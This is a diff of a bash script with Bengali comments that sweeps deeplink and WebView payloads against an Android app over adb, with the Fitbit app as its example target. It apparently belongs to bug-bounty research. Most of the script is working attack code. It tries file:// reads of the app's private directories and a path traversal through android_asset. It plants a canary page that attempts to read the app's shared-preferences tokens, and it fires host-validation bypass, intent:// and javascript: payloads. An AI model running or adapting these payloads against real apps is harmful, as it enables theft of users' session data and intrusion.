@@ -1,26 +1,26 @@
 #!/usr/bin/env bash
-# mvrp-screen.sh — deeplink/WebView payload sweep, oracle = পর্দার আসল লেখা।
+# mvrp-screen.sh — deeplink/WebView payload sweep.
 #
-# কেন নতুন যন্ত্র (অষ্টম যন্ত্র-ত্রুটির পর):
-#   mvrp-payload.sh-এর oracle ছিল logcat-এ 'WebFrameActivity' খোঁজা। কিন্তু
-#   BufferQueueProducer প্রতিবার Activity খোলা/বন্ধ হলেই ওই শব্দটা লেখে —
-#   URL লোড হয়েছে কিনা তার সাথে সম্পর্ক নেই। ফলে ACCEPT-control আর
-#   REJECT-control দুটোই একই রায় দিয়েছে। যে যন্ত্র দুটো জানা-ভিন্ন অবস্থাকে
-#   আলাদা করতে পারে না, তার কোনো রায়ের কোনো মূল্য নেই।
+# দুটো oracle, দুটোই যাচাইযোগ্য:
+#   ১. topResumedActivity — app-এর কোনো activity উপরে এল কিনা। এটাই
+#      "deeplink গ্রহণ হয়েছে" প্রশ্নের সরাসরি উত্তর, অস্পষ্টতা নেই।
+#   ২. uiautomator dump — পর্দায় আসলে কী লেখা। ডিরেক্টরি তালিকা, net::ERR,
+#      canary-র ফল; গ্রাফিক্স লগের কোলাহল এতে নেই।
 #
-#   এখানে oracle = uiautomator dump. পর্দায় যা লেখা আছে তা-ই ফেরত আসে:
-#   ডিরেক্টরি তালিকার ফাইলনাম, 'net::ERR_ACCESS_DENIED', app-এর নিজের স্ট্রিং।
+# ইতিহাস (কেন এত control):
+#   mvrp-payload.sh logcat-এ 'WebFrameActivity' খুঁজত। BufferQueueProducer
+#   প্রতিবার activity খোলা/বন্ধ হলেই ওই নাম লেখে, তাই accept আর reject
+#   দুটোই একই রায় পেয়েছিল। অষ্টম যন্ত্র-ত্রুটি, তৃতীয়বার একই প্রজাতির:
+#   কোলাহল থেকে আত্মবিশ্বাসী রায়।
 #
-# যন্ত্র-বৈধতা (STAGE 0) — payload চালানোর **আগে** তিনটে হ্যাশ নেওয়া হয়:
-#     H0 = HOME পর্দা
-#     H1 = জানা-গ্রহণযোগ্য URL
-#     H2 = জানা-প্রত্যাখ্যাত URL
-#   H1 == H0  -> deeplink রুটই করছে না, বা পর্দা পড়া যাচ্ছে না
-#   H1 == H2  -> যন্ত্র গ্রহণ আর প্রত্যাখ্যান আলাদা করতে পারছে না
-#   যেকোনোটা হলে exit 2 — কোনো payload চলবে না, কোনো রায় ছাপা হবে না।
+#   প্রথম সংস্করণে control ছিল, কিন্তু যথেষ্ট ছিল না: REJECT-CTL যদি
+#   launcher পর্দা দেয়, সেটা "app প্রত্যাখ্যান করেছে" হতেও পারে, "app
+#   সময়ে খোলেনি" হতেও পারে। একবারের মাপে তফাত করা যায় না। তাই এখন
+#   প্রতিটা control REPS বার চলে আর ফল স্থির না হলে রান বাতিল।
 #
 # ব্যবহার:
 #   ./mvrp-screen.sh 'fitbit://webview?url=' com.fitbit.FitbitMobile
+#   REPS=3 WAIT=10 ./mvrp-screen.sh '<prefix>' <pkg>
 #   ACCEPT_URL='https://m.app.example/' ./mvrp-screen.sh '<prefix>' <pkg>
 set -uo pipefail
 
@@ -29,12 +29,12 @@ PKG="${2:?package লাগবে}"
 OUT="${MVRP_OUT:-$HOME/mvrp}"
 REP="$OUT/screen/$(date +%Y%m%d-%H%M)"; mkdir -p "$REP"
 LOG="$REP/report.txt"
-WAIT="${WAIT:-6}"
+WAIT="${WAIT:-8}"
+REPS="${REPS:-2}"
 PRIV="/data/data/$PKG"
 
-# control URL: app-এর নিজের host জানা থাকলে সেটাই সেরা accept-control
 case "$PKG" in
-  *fitbit*)  ACCEPT_URL="${ACCEPT_URL:-https://www.fitbit.com/help}" ;;
+  *fitbit*)  ACCEPT_URL="${ACCEPT_URL:-https://www.fitbit.com/}" ;;
   *)         ACCEPT_URL="${ACCEPT_URL:-https://www.google.com/}" ;;
 esac
 REJECT_URL="${REJECT_URL:-https://example.org/}"
@@ -42,14 +42,12 @@ REJECT_URL="${REJECT_URL:-https://example.org/}"
 command -v adb >/dev/null || { echo "!! adb নেই"; exit 1; }
 adb get-state >/dev/null 2>&1 || { echo "!! device connected নয়"; exit 1; }
 
-# ---------- পর্দা জাগানো, নইলে dump খালি আসে (পাঁচ নম্বর যন্ত্র-ত্রুটি) ----------
 adb shell svc power stayon usb >/dev/null 2>&1 </dev/null
 adb shell input keyevent KEYCODE_WAKEUP >/dev/null 2>&1 </dev/null
 
 enc() { printf '%s' "$1" | sed 's|%|%25|g; s|:|%3A|g; s|/|%2F|g; s|?|%3F|g; s|&|%26|g; s|#|%23|g; s|=|%3D|g; s| |%20|g'; }
+sig() { sha1sum <<<"$1" | cut -c1-12; }
 
-# ---------- oracle ----------
-# পর্দার সব দৃশ্যমান লেখা। দুটো পথ: exec-out /dev/tty (দ্রুত), না হলে ফাইল।
 screen_text() {
   local x
   x=$(adb exec-out uiautomator dump /dev/tty 2>/dev/null </dev/null | tr -d '\r')
@@ -61,19 +59,26 @@ screen_text() {
   grep -oE '(text|content-desc)="[^"]*"' <<<"$x" \
     | sed 's/^[a-z-]*="//; s/"$//' | grep -v '^$' | sort -u
 }
-sig() { sha1sum <<<"$1" | cut -c1-12; }
 top_act() {
   adb shell dumpsys activity activities 2>/dev/null </dev/null | tr -d '\r' \
-    | grep -oE 'topResumedActivity.*\{[^}]*\}|mResumedActivity.*\{[^}]*\}' | head -1
+    | grep -oE '(topResumedActivity|mResumedActivity)[^\n]*\{[^}]*\}' | head -1 \
+    | sed 's/.* u0 //; s/ t[0-9]*}//; s/}$//'
+}
+# গ্রহণ/প্রত্যাখ্যান: কার activity উপরে এল। screen-text নয় — এটা দ্বিধাহীন।
+acc() {
+  case "$1" in
+    *"$PKG"*)                 echo APP_OPENED ;;
+    *[Ll]auncher*|"")         echo DROPPED ;;
+    *)                        echo "OTHER_APP" ;;
+  esac
 }
 
-# ---------- fire ----------
-# প্রতিবার force-stop: আগের WebView পর্দায় রয়ে গেলে পরের payload-এর রায়
-# আগেরটার অবশিষ্টাংশ পড়ে। (এটাই ছিল গণনা-ভিত্তিক control-এর ভুল।)
-N=0
+# ---------- fire: সব ফল global-এ, কারণ $(...) subshell array হারিয়ে ফেলে ----------
+N=0; FTEXT=""; FSIG=""; FACT=""; FACC=""; FFILE=""; STABLE=1
+SIG_L=(); URL_L=(); ACT_L=(); FILE_L=(); LBL_L=()
 fire() {
   local url="$1" name="$2"
-  N=$((N+1))
+  N=$((N+1)); FFILE=$(printf '%02d-%s' "$N" "$name")
   adb shell am force-stop "$PKG" >/dev/null 2>&1 </dev/null
   adb shell input keyevent KEYCODE_HOME >/dev/null 2>&1 </dev/null
   sleep 1
@@ -81,16 +86,26 @@ fire() {
   adb shell am start -a android.intent.action.VIEW -d "'$BASE$(enc "$url")'" \
     >/dev/null 2>&1 </dev/null
   sleep "$WAIT"
-  local t; t=$(screen_text)
-  printf '%s\n' "$t" > "$REP/$(printf '%02d' $N)-$name.txt"
-  adb logcat -d 2>/dev/null </dev/null | grep -iE 'Cannot load|net::ERR|chromium.*CONSOLE' \
-    | head -5 > "$REP/$(printf '%02d' $N)-$name.logcat" 2>/dev/null
-  printf '%s' "$t"
+  FTEXT=$(screen_text); FSIG=$(sig "$FTEXT")
+  FACT=$(top_act);      FACC=$(acc "$FACT")
+  printf '%s\n' "$FTEXT" > "$REP/$FFILE.txt"
+  printf '%s\n' "$FACT"  > "$REP/$FFILE.act"
+  adb logcat -d 2>/dev/null </dev/null \
+    | grep -iE 'Cannot load|net::ERR|chromium.*CONSOLE|shouldOverrideUrl' \
+    | head -6 > "$REP/$FFILE.logcat" 2>/dev/null
+  SIG_L+=("$FSIG"); URL_L+=("$url"); ACT_L+=("$FACT"); FILE_L+=("$FFILE"); LBL_L+=("$name")
+}
+# একই URL REPS বার — sig স্থির না হলে ওই মাপটা অবিশ্বাস্য
+fire_stable() {
+  local url="$1" name="$2" i s0=""
+  for ((i=1;i<=REPS;i++)); do
+    fire "$url" "$name"
+    [ -z "$s0" ] && s0="$FSIG"
+    if [ "$FSIG" != "$s0" ]; then STABLE=0; return; fi
+  done
+  STABLE=1
 }
 
-# ---------- শ্রেণিবিভাগ ----------
-# শুধু যেগুলো অস্পষ্ট নয় সেগুলোই নাম পায়। বাকি সব = হ্যাশ, control-এর সাথে
-# মিলিয়ে পড়তে হবে। "কিছু একটা হয়েছে" কখনো রায় নয়।
 classify() {
   local t="$1"
   if   [ "$t" = "__DUMP_FAILED__" ];                      then echo DUMP_FAILED
@@ -100,93 +115,88 @@ classify() {
   elif grep -qE '^[A-Za-z0-9_.-]+\.(xml|db|db-journal|json)$' <<<"$t"; then echo FILE_LISTING
   elif grep -qE 'Index of|/data/data/' <<<"$t";           then echo PATH_ON_SCREEN
   elif grep -oE 'net::ERR_[A-Z_]+' <<<"$t" | head -1 | grep -q .; then
-       echo "ERR:$(grep -oE 'net::ERR_[A-Z_]+' <<<"$t" | head -1)"
+       echo "$(grep -oE 'net::ERR_[A-Z_]+' <<<"$t" | head -1)"
   elif grep -qiE 'Webpage not available|cannot be loaded|Can.t open this page' <<<"$t"; then echo LOAD_REFUSED
   else echo "SCREEN"
   fi
 }
+row() { printf '%-11s %-22s %-13s %s\n' "$1" "$2" "$3" "$4"; }
 
 {
-echo "# mvrp-screen — oracle: uiautomator dump (পর্দার আসল লেখা)"
+echo "# mvrp-screen — oracle: topResumedActivity + uiautomator dump"
 echo "# base    : $BASE"
 echo "# pkg     : $PKG"
 echo "# when    : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
 echo "# device  : $(adb shell getprop ro.product.model 2>/dev/null | tr -d '\r') / Android $(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')"
 echo "# ip      : $(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo n/a)"
-echo "# dumps   : $REP/"
+echo "# wait=$WAIT  reps=$REPS  dumps=$REP/"
 echo
 
-# ================= STAGE 0 : যন্ত্র-বৈধতা =================
-echo "===== STAGE 0 — যন্ত্র-বৈধতা ====="
+# ================= STAGE 0 =================
+echo "===== STAGE 0 — যন্ত্র-বৈধতা (প্রতিটা control $REPS বার) ====="
 adb shell am force-stop "$PKG" >/dev/null 2>&1 </dev/null
 adb shell input keyevent KEYCODE_HOME >/dev/null 2>&1 </dev/null; sleep 2
-H0T=$(screen_text); H0=$(sig "$H0T")
-printf '%s\n' "$H0T" > "$REP/00-home.txt"
-echo "HOME        sig=$H0   ($(wc -l <<<"$H0T") লাইন লেখা)"
+H0T=$(screen_text); H0=$(sig "$H0T"); printf '%s\n' "$H0T" > "$REP/00-home.txt"
+row "HOME" "$H0" "$(acc "$(top_act)")" "(বেসলাইন, $(wc -l <<<"$H0T") লাইন)"
 
-A1T=$(fire "$ACCEPT_URL" accept-ctl); H1=$(sig "$A1T")
-echo "ACCEPT-CTL  sig=$H1   $(classify "$A1T")   $ACCEPT_URL"
-echo "            top: $(top_act)"
-R2T=$(fire "$REJECT_URL" reject-ctl); H2=$(sig "$R2T")
-echo "REJECT-CTL  sig=$H2   $(classify "$R2T")   $REJECT_URL"
-echo "            top: $(top_act)"
+fire_stable "$ACCEPT_URL" accept-ctl
+H1="$FSIG"; A1T="$FTEXT"; A1ACC="$FACC"; A1STABLE="$STABLE"
+row "ACCEPT-CTL" "$H1" "$A1ACC" "$(classify "$A1T")   $ACCEPT_URL"
+echo "            activity: $FACT   stable=$A1STABLE"
+
+fire_stable "$REJECT_URL" reject-ctl
+H2="$FSIG"; R2T="$FTEXT"; R2ACC="$FACC"; R2STABLE="$STABLE"
+row "REJECT-CTL" "$H2" "$R2ACC" "$(classify "$R2T")   $REJECT_URL"
+echo "            activity: $FACT   stable=$R2STABLE"
 echo
 
 FAIL=0
-if [ "$H0T" = "__DUMP_FAILED__" ] || [ "$A1T" = "__DUMP_FAILED__" ]; then
-  echo "!! BROKEN: uiautomator dump কাজ করছে না (পর্দা লক? developer option?)"; FAIL=1
-fi
-if [ "$H1" = "$H0" ]; then
-  echo "!! BROKEN: ACCEPT-CTL পর্দা HOME-এর সমান — deeplink রুটই করছে না।"
-  echo "   যাচাই করো:  adb shell dumpsys package $PKG | grep -A3 'android.intent.action.VIEW'"
+[ "$A1T" = "__DUMP_FAILED__" ] && { echo "!! BROKEN: uiautomator dump কাজ করছে না (পর্দা লক?)"; FAIL=1; }
+[ "$A1STABLE" -eq 0 ] && { echo "!! UNSTABLE: ACCEPT-CTL দুবার ভিন্ন পর্দা দিয়েছে — WAIT বাড়াও (WAIT=14)"; FAIL=1; }
+[ "$R2STABLE" -eq 0 ] && { echo "!! UNSTABLE: REJECT-CTL দুবার ভিন্ন পর্দা দিয়েছে — WAIT বাড়াও (WAIT=14)"; FAIL=1; }
+if [ "$A1ACC" != "APP_OPENED" ]; then
+  echo "!! BROKEN: জানা-গ্রহণযোগ্য URL-এও app-এর activity উপরে আসেনি ($A1ACC)।"
+  echo "   deeplink রুট করছে কিনা দেখো:"
+  echo "   adb shell dumpsys package $PKG | grep -B2 -A6 'android.intent.action.VIEW'"
   FAIL=1
 fi
-if [ "$H1" = "$H2" ]; then
-  echo "!! NOT DISCRIMINATING: accept আর reject একই পর্দা দিচ্ছে।"
-  echo "   diff দেখো: diff $REP/01-accept-ctl.txt $REP/02-reject-ctl.txt"
+if [ "$A1ACC" = "$R2ACC" ] && [ "$H1" = "$H2" ]; then
+  echo "!! NOT DISCRIMINATING: accept আর reject একই activity + একই পর্দা।"
   FAIL=1
 fi
 if [ "$FAIL" -eq 1 ]; then
-  echo
-  echo "===== থামলাম। যন্ত্র বৈধ নয়, তাই কোনো payload চালানো হলো না। ====="
-  echo "ফল: অনিষ্পন্ন (inconclusive), নেতিবাচক নয়। এটাই নথিতে লেখো।"
+  echo; echo "===== থামলাম। যন্ত্র বৈধ নয়, কোনো payload চালানো হয়নি। ====="
+  echo "ফল: অনিষ্পন্ন (inconclusive), নেতিবাচক নয়। নথিতে এটাই লেখো।"
   exit 2
 fi
-echo "VALIDATED   H0/H1/H2 তিনটে আলাদা — যন্ত্র গ্রহণ ও প্রত্যাখ্যান আলাদা করতে পারে।"
+echo "VALIDATED  accept=$A1ACC/$H1   reject=$R2ACC/$H2   দুটোই $REPS বার স্থির।"
 echo
 
-# ================= STAGE 1 : file:// নাগাল =================
+# ================= STAGE 1 =================
 echo "===== STAGE 1 — file:// দিয়ে app-এর ব্যক্তিগত ডিরেক্টরি ====="
-# decompile করা সোর্স থাকলে আসল prefs-ফাইলের নাম বের করো — অনুমান নয়।
-PREFS=()
-SRCD="$OUT/src/$PKG/sources"
+PREFS=(); SRCD="$OUT/src/$PKG/sources"
 if [ -d "$SRCD" ]; then
   mapfile -t PREFS < <(grep -rhoE 'getSharedPreferences\("[^"]+"' "$SRCD" 2>/dev/null \
     | sed 's/.*("//; s/"$//' | sort -u | head -6)
   echo "# সোর্স থেকে পাওয়া prefs নাম: ${PREFS[*]:-(কিছু নেই)}"
+else
+  echo "# সোর্স নেই ($SRCD) — ফাইলনাম অনুমান করা হচ্ছে, তাই এই ধাপ দুর্বল।"
+  echo "#   আগে চালাও: jadx -d $OUT/src/$PKG $OUT/apk/$PKG/base.apk"
 fi
-
 S1=( "file://$PRIV/shared_prefs/" "file://$PRIV/databases/" "file://$PRIV/files/"
      "file:///android_asset/../../../..$PRIV/shared_prefs/"
      "file:///proc/self/cmdline" "file:///etc/hosts" )
 for p in "${PREFS[@]}"; do [ -n "$p" ] && S1+=( "file://$PRIV/shared_prefs/$p.xml" ); done
-
-FILE_OK=0
 for p in "${S1[@]}"; do
-  t=$(fire "$p" "s1"); v=$(classify "$t")
-  printf '%-22s %s\n' "$v" "$p"
-  case "$v" in FILE_LISTING|PATH_ON_SCREEN) FILE_OK=1
-    grep -E '\.(xml|db|json)$' <<<"$t" | head -6 | sed 's/^/                       /' ;;
+  fire "$p" s1
+  row "$FACC" "$FSIG" "$(classify "$FTEXT")" "$p"
+  case "$(classify "$FTEXT")" in
+    FILE_LISTING|PATH_ON_SCREEN) grep -E '\.(xml|db|json)$' <<<"$FTEXT" | head -6 | sed 's/^/              /' ;;
   esac
-  [ "$(sig "$t")" = "$H2" ] && echo "                       (= REJECT-CTL পর্দা)"
 done
 echo
 
-# ================= STAGE 2 : canary — আসল theft primitive =================
-# file:// লোড হলেই থামা যায় না। আসল প্রশ্ন: file:// পাতা কি **অন্য**
-# file:// পড়তে পারে? setAllowFileAccessFromFileURLs / Universal... true হলে
-# একটা sdcard-এর HTML app-এর টোকেন পড়ে ফেলতে পারে = Theft of Sensitive Data.
-# canary নিজের পর্দাতেই ফল লেখে, নেটওয়ার্কে কিছু পাঠায় না।
+# ================= STAGE 2 =================
 echo "===== STAGE 2 — file:// থেকে file:// (universal file access) ====="
 TARGET="$PRIV/shared_prefs/"
 [ "${#PREFS[@]}" -gt 0 ] && [ -n "${PREFS[0]:-}" ] && TARGET="$PRIV/shared_prefs/${PREFS[0]}.xml"
@@ -205,21 +215,20 @@ try{
 </script></body></html>
 HTML
 adb push "$CAN" /sdcard/mvrp-canary.html >/dev/null 2>&1 </dev/null \
-  && echo "# canary পাঠানো হয়েছে, লক্ষ্য: $TARGET" \
-  || echo "!! canary push ব্যর্থ"
-t=$(fire "file:///sdcard/mvrp-canary.html" "canary"); v=$(classify "$t")
-printf '%-22s %s\n' "$v" "file:///sdcard/mvrp-canary.html"
-grep -i 'MVRPREAD' <<<"$t" | head -3 | sed 's/^/                       /'
-case "$v" in
-  CANARY_READ_PRIVATE) echo "                       *** app-এর ব্যক্তিগত ফাইল একটা বাইরের HTML পড়েছে।" ;;
-  CANARY_RENDERED|CANARY_READ_BLOCKED) echo "                       (canary রেন্ডার হয়েছে — তাই FAIL মানে সত্যিই ব্লকড, যন্ত্র-ত্রুটি নয়)" ;;
-  *) echo "                       (canary রেন্ডারই হয়নি -> file:// বন্ধ। এই ধাপ অনিষ্পন্ন।)" ;;
+  && echo "# canary পাঠানো হয়েছে, লক্ষ্য: $TARGET" || echo "!! canary push ব্যর্থ"
+fire "file:///sdcard/mvrp-canary.html" canary
+V=$(classify "$FTEXT")
+row "$FACC" "$FSIG" "$V" "file:///sdcard/mvrp-canary.html"
+grep -i 'MVRPREAD' <<<"$FTEXT" | head -3 | sed 's/^/              /'
+case "$V" in
+  CANARY_READ_PRIVATE) echo "              *** বাইরের একটা HTML app-এর ব্যক্তিগত ফাইল পড়েছে।" ;;
+  CANARY_RENDERED|CANARY_READ_BLOCKED) echo "              (canary রেন্ডার হয়েছে, তাই FAIL সত্যিই ব্লকড — যন্ত্র-ত্রুটি নয়)" ;;
+  *) echo "              (canary রেন্ডারই হয়নি -> file:// বন্ধ। এই ধাপ অনিষ্পন্ন।)" ;;
 esac
 rm -f "$CAN"
 echo
 
-# ================= STAGE 3 : host-যাচাই বাইপাস =================
-# endsWith / contains / startsWith দিয়ে host মেলালে এগুলোর একটা পার হয়।
+# ================= STAGE 3 =================
 echo "===== STAGE 3 — host-যাচাই বাইপাস ====="
 H=$(sed 's|^https\?://||; s|/.*||' <<<"$ACCEPT_URL")
 S3=( "https://$H.evil.example/" "https://evil$H/" "https://$H@example.org/"
@@ -230,30 +239,47 @@ S3=( "https://$H.evil.example/" "https://evil$H/" "https://$H@example.org/"
      "content://$PKG.fileprovider/root/sdcard/mvrp-canary.html"
      "intent://x/#Intent;scheme=http;package=$PKG;end" )
 for p in "${S3[@]}"; do
-  t=$(fire "$p" "s3"); v=$(classify "$t"); s=$(sig "$t")
+  fire "$p" s3
   tag=""
-  [ "$s" = "$H1" ] && tag="  <= ACCEPT-CTL পর্দার সমান (গ্রহণ হয়েছে)"
-  [ "$s" = "$H2" ] && tag="  (= REJECT-CTL)"
-  grep -q 'MVRP-JS' <<<"$t" && tag="  <= javascript: চলেছে"
-  printf '%-22s %-46s sig=%s%s\n' "$v" "$p" "$s" "$tag"
+  [ "$FSIG" = "$H1" ] && tag="  <= ACCEPT-CTL পর্দার সমান"
+  [ "$FSIG" = "$H2" ] && tag="  (= REJECT-CTL)"
+  grep -q 'MVRP-JS' <<<"$FTEXT" && tag="  <= javascript: চলেছে"
+  row "$FACC" "$FSIG" "$(classify "$FTEXT")" "$p$tag"
+done
+echo
+
+# ================= পর্দার শ্রেণি =================
+# এই টেবিলটাই গতবার ছিল না, আর সেটাই আমাকে অন্ধ করে রেখেছিল: পাঁচটা
+# আলাদা sig পেয়েছিলাম কিন্তু কোনটায় কী লেখা তা জানার উপায় ছিল না।
+echo "===== পর্দার শ্রেণি — প্রতিটা আলাদা পর্দা একবার করে ====="
+for s in $(printf '%s\n' "${SIG_L[@]}" | sort -u); do
+  for i in "${!SIG_L[@]}"; do
+    if [ "${SIG_L[$i]}" = "$s" ]; then
+      echo "--- sig=$s   activity=${ACT_L[$i]}"
+      sed -n '1,5p' "$REP/${FILE_L[$i]}.txt" | sed 's/^/      | /'
+      [ -s "$REP/${FILE_L[$i]}.logcat" ] && sed -n '1,3p' "$REP/${FILE_L[$i]}.logcat" | sed 's/^/      LOG /'
+      break
+    fi
+  done
+  for i in "${!SIG_L[@]}"; do
+    [ "${SIG_L[$i]}" = "$s" ] && echo "        <- ${URL_L[$i]}"
+  done
+  echo
 done
 
 cat <<'NOTE'
-
 ===== পড়ার নিয়ম =====
-CANARY_READ_PRIVATE  একটা বাইরের HTML app-এর ব্যক্তিগত ফাইল পড়েছে।
-                     পর্দার লেখায় ফাইলের বিষয়বস্তু আছে। token/session থাকলে
-                     Theft of Sensitive Data — দৃশ্য ৩, Tier অনুযায়ী $4,500+।
-FILE_LISTING         ব্যক্তিগত ডিরেক্টরির ফাইলনাম পর্দায়। এটা **precondition**,
-                     crossing নয় (CLAUDE.md 2.6)। পরের ধাপ: নির্দিষ্ট ফাইল পড়া।
-"<= ACCEPT-CTL সমান" ওই URL app গ্রহণ করেছে। বাইরের host হলে host-যাচাই
-                     বাইপাস — তখন প্রশ্ন: ভেতরে JS bridge বা token আছে কি?
-ERR:net::ERR_*       WebView নিজে আটকেছে। ACCESS_DENIED = file access বন্ধ।
-SCREEN               নামহীন। sig মিলিয়ে পড়ো, নয়তো অনিষ্পন্ন।
-DUMP_FAILED          পর্দা পড়া যায়নি — ওই মাপটা বাতিল, নেতিবাচক নয়।
+প্রথম কলাম = কার activity উপরে এল। APP_OPENED মানে app ওই URL-টা গ্রহণ
+করেছে; DROPPED মানে deeplink হাতেই নেয়নি। এটাই গ্রহণ/প্রত্যাখ্যানের মাপ।
 
-প্রতিটা payload-এর পুরো পর্দার লেখা আর logcat আলাদা ফাইলে আছে ($REP/)।
-রিপোর্ট লেখার সময় ওই ফাইলই verbatim প্রমাণ (CLAUDE.md 9.8)।
+APP_OPENED + বাইরের host  ->  host-যাচাই বাইপাস। পরের প্রশ্ন একটাই:
+                              ওই WebView-এ JS bridge বা token যায় কি?
+CANARY_READ_PRIVATE       ->  বাইরের HTML app-এর ব্যক্তিগত ফাইল পড়েছে।
+                              token থাকলে Theft of Sensitive Data।
+FILE_LISTING              ->  precondition, crossing নয় (CLAUDE.md 2.6)।
+net::ERR_*                ->  URL নেটওয়ার্ক স্ট্যাকে পৌঁছেছে তারপর ব্যর্থ —
+                              অর্থাৎ app গ্রহণ করেছিল। এটা সংকেত, ব্যর্থতা নয়।
+DROPPED সবখানে            ->  অনিষ্পন্ন নয়, এটাই নেতিবাচক ফল: যাচাই কাজ করছে।
 NOTE
 } 2>&1 | tee "$LOG"
 
